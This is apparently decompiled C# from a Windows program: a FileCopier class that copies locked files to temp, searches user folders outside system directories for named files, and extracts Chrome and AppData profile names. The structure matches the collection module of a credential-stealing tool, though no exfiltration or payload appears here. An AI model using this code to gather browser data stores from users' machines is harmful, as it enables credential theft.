using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

// Token: 0x02000046 RID: 70
public class FileCopier : IDisposable
{
	// Token: 0x06000156 RID: 342
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

	// Token: 0x06000157 RID: 343 RVA: 0x0000BC14 File Offset: 0x00009E14
	public string CreateShadowCopy(string filePath)
	{
		string result;
		try
		{
			this.tmpFilename = Path.GetTempFileName();
			if (FileCopier.CopyToTemp(filePath, this.tmpFilename))
			{
				this.createdNew = true;
				result = this.tmpFilename;
			}
			else if (FileCopier.CopyToTemp(filePath, this.tmpFilename))
			{
				this.createdNew = true;
				result = this.tmpFilename;
			}
			else
			{
				this.createdNew = false;
				result = filePath;
			}
		}
		catch
		{
			this.createdNew = false;
			result = filePath;
		}
		return result;
	}

	// Token: 0x06000158 RID: 344 RVA: 0x0000BC90 File Offset: 0x00009E90
	private static bool CopyToTemp(string filePath, string temp)
	{
		bool result;
		try
		{
			result = FileCopier.CopyFile(filePath, temp, false);
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000159 RID: 345 RVA: 0x0000BCC0 File Offset: 0x00009EC0
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		list.Add("\\Windows\\");
		list.Add("\\Program Files\\");
		list.Add("\\Program Files (x86)\\");
		list.Add("\\Program Data\\");
		List<string> list2 = new List<string>();
		if (files == null || files.Length == 0 || level > maxLevel)
		{
			return list2;
		}
		try
		{
			foreach (string text in Directory.GetDirectories(baseDirectory))
			{
				bool flag = false;
				foreach (string value in list)
				{
					if (text.Contains(value))
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag2 = false;
						int num = 0;
						while (num < files2.Length && !flag2)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag2)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag2 = true;
									list2.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in FileCopier.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list2.Contains(item))
							{
								list2.Add(item);
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list2;
	}

	// Token: 0x0600015A RID: 346 RVA: 0x0000BEBC File Offset: 0x0000A0BC
	public static string ChromeGetName(string path)
	{
		try
		{
			string[] array = path.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array[array.Length - 2].Contains("User Data"))
			{
				return array[array.Length - 1];
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x0600015B RID: 347 RVA: 0x0000BF1C File Offset: 0x0000A11C
	public static string ChromeGetRoamingName(string path)
	{
		try
		{
			return path.Split(new string[]
			{
				"AppData\\Roaming\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x0600015C RID: 348 RVA: 0x0000BF78 File Offset: 0x0000A178
	public static string ChromeGetLocalName(string path)
	{
		try
		{
			string[] array = path.Split(new string[]
			{
				"AppData\\Local\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_[" + array[1] + "]";
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x0600015D RID: 349 RVA: 0x0000BFE8 File Offset: 0x0000A1E8
	public void Dispose()
	{
		try
		{
			if (this.createdNew)
			{
				File.Delete(this.tmpFilename);
			}
		}
		catch
		{
		}
	}

	// Token: 0x04000045 RID: 69
	private string tmpFilename;

	// Token: 0x04000046 RID: 70
	private bool createdNew;
}
